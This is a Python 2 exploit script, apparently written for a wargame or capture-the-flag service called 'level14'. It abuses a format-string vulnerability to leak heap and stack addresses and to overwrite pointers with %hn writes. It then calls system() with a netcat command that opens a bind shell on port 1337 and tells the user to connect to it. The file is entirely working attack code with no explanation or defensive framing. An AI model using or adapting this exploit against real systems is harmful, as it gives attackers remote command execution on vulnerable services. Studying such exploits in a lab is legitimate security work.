#!/usr/bin/env python
#Balazs Bucsay @xoreipeip
import socket
import time

TCP_IP = '10.0.0.1'
TCP_PORT = 20014
BUFFER_SIZE = 65536

def generate_formatstring(value, align):
	time.sleep(0.5)

	bw = 0x00
	byte = (((value & 0xFFFF) - bw) & 0xFFFF)
	bw += byte
	alignaddr = ((alignedstack - bw + align) & 0xFFFF)

	payload  = "%"+str(byte)+"x%263$hn" # set half byte on previously set address
	payload += "%"+str(alignaddr)+"x%256$hn" # set addr to next half byte
	payload += "\n\x00"

	return payload


#%1$x - heap leak
#%4$x - reliable stack leak
#%6$x - level14 binary base
#%256$x - pointer on stack which points to a pointer that points to stack
#%263$x - pointer that points to stack
#256 -> 263 -> stack (all values on stack)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send("%1$x%6$x%4$x%256$x%263$x\n")
data = s.recv(BUFFER_SIZE)

fsrleak = data[0:8]
level14baseleak = data[8:16]
stackropleak = data[16:24]
stackp2pleak = data[24:32]
stackpleak = data[32:40]
level14base = int(level14baseleak, 16) - 0xb700
stackrop = int(stackropleak, 16) - 0x234
stackp2p = int(stackp2pleak, 16)
stackp = int(stackpleak, 16)

fsr = int(fsrleak, 16) + 0x78c8 # second heap variable - last heap variable distance
systemaddr = level14base - 0x39160
exitaddr = level14base - 0x29f620
alignedstack = (stackp2p & 0xFFFFFFFC) + 0x30


bw = 0x00
p2pbytelo = ((alignedstack - bw) & 0xFFFF) + 0
payload0  = "%"+str(p2pbytelo)+"x%256$hn" # aligning the stack!
payload0 += "\n\x00"
s.send(payload0)
s.recv(BUFFER_SIZE)
print "[+] stack address aligned"

for i in range(1,7):
	s.send(generate_formatstring(stackrop + (i-1)*2, i*4-2))
	s.recv(BUFFER_SIZE)
	s.send(generate_formatstring(stackrop >> 0x10, i*4))
	s.recv(BUFFER_SIZE)
	print "[+] %d. value set" % i

bw = 0x28 # length of shell payload
bytelo1 = (((systemaddr & 0xFFFF) - bw) & 0xFFFF)
bw += bytelo1
bytehi1 = ((((systemaddr >> 16) & 0xFFFF) - bw) & 0xFFFF)
bw += bytehi1

bytelo2 = (((exitaddr & 0xFFFF) - bw) & 0xFFFF) 
bw += bytelo2
bytehi2 = ((((exitaddr >> 16) & 0xFFFF) - bw) & 0xFFFF)
bw += bytehi2

bytelo3 = (((fsr & 0xFFFF) - bw) & 0xFFFF)
bw += bytelo3
bytehi3 = ((((fsr >> 16) & 0xFFFF) - bw) & 0xFFFF)
bw += bytehi3

payloadx  = "/bin/nc.traditional -ltp 1337 -e/bin/sh;" # eat this system()!
payloadx += "%"+str(bytelo1)+"x%275$hn%"+str(bytehi1)+"x%276$hn" # ret to system
payloadx += "%"+str(bytelo2)+"x%277$hn%"+str(bytehi2)+"x%278$hn" # exit() pointer 
payloadx += "%"+str(bytelo3)+"x%279$hn%"+str(bytehi3)+"x%280$hn" # heap addr that points to this payload
payloadx += "\n\x00"
s.send(payloadx)
print "[+] last payload sent, rop on stack"
print "You can connect to %s on port tcp/1337 now." % TCP_IP

time.sleep(1)

